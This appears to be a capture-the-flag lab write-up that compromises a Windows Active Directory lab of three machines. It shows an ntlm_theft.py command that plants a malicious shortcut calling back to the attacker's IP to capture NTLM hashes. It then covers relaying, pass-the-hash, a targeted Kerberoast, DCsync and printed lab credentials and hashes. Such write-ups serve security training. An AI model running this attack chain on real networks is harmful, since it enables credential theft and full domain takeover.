# Laser
## Network

**Given:**

- 192.168.195.0/24

**Found:**

- 192.168.195.173 MS01
- 192.168.195.174 MS02
- 192.168.195.172 DC01

## Creds

```
eric.wallows:EricLikesRunning800
yulia.weber:Yulia@Laser777
boris.crawford:zxcvbnm
```

## Enumeration

Ping sweep the subnet to find four machines.

![](assets/Pasted%20image%2020250228232033.png)

## 192.168.195.173 MS01

### Enumeration

![](assets/Pasted%20image%2020250228232513.png)

Using the provided credentials, we can access a shared folder called Apps in SMB.

![](assets/Pasted%20image%2020250301115525.png)

We can see shortcuts and a task scheduler one. It seems that a user clicks those shortcuts to open the apps. So, we can capture the hash by replacing the shortcut with a UNC path.

First, create the shortcut with `ntlm_theft.py`

```powershell
python ntlm_theft/ntlm_theft.py -g lnk -s 192.168.45.191 -f Services
```

Put the file into the share.

![](assets/Pasted%20image%2020250301124338.png)

Create an SMB server and wait.

![](assets/Pasted%20image%2020250301124356.png)

We can use it to relay to another host. Using ntlmrelay, we point to another host without SMB signing. We can check the signing with nxc.

![](assets/Pasted%20image%2020250301125934.png)

So, we have to point to .174.

The execution of the shell doesn't work, so let's dump hashes.

![](assets/Pasted%20image%2020250302101049.png)

We have a hit from carl.dean.

![](assets/Pasted%20image%2020250302101143.png)

And got the hash of `Administrator:15759746f66f2da88d58f0160f8ee676`.

## 192.168.195.174 MS02

### Enumeration

![](assets/Pasted%20image%2020250228232451.png)

### Initial Access

Using the hash from MS01, we can enter as administrator.

![](assets/Pasted%20image%2020250302101610.png)

### Post Exploitation

Get the flag.

![](assets/Pasted%20image%2020250302101702.png)

In the documents folder, there is a pcapng file that we can open with Wireshark. Use "Find Packages" and select "String," and by searching for "login," we find credentials.

![](assets/Pasted%20image%2020250302113808.png)

We have `yulia.weber:Yulia@Laser777`.

With nxc, we can see that Yulia can RDP to DC.

![](assets/Pasted%20image%2020250302115526.png)

## 192.168.195.172 DC01

### Enumeration

![](assets/Pasted%20image%2020250228232421.png)

### Initial Access

Using Yulia's credentials, we RDP into the machine.

![](assets/Pasted%20image%2020250302115659.png)

### Privilege Escalation

Read the flag on the desktop.

![](assets/Pasted%20image%2020250302115727.png)

Using bloodhound-python, we can see that Yulia has GenericWrite to Boris, so we can make a targeted Kerberoast.

![](assets/Pasted%20image%2020250302125256.png)

![](assets/Pasted%20image%2020250302130537.png)

Using hashcat, we have `boris.crawford:zxcvbnm`.

![](assets/Pasted%20image%2020250302130651.png)

![](assets/Pasted%20image%2020250302130704.png)

![](assets/Pasted%20image%2020250302131148.png)

### Post Exploitation

Now we can perform a DCsync attack to get the domain admin's password.

![](assets/Pasted%20image%2020250302132225.png)

Enter with evil-winrm and get the flag.

![](assets/Pasted%20image%2020250302132435.png)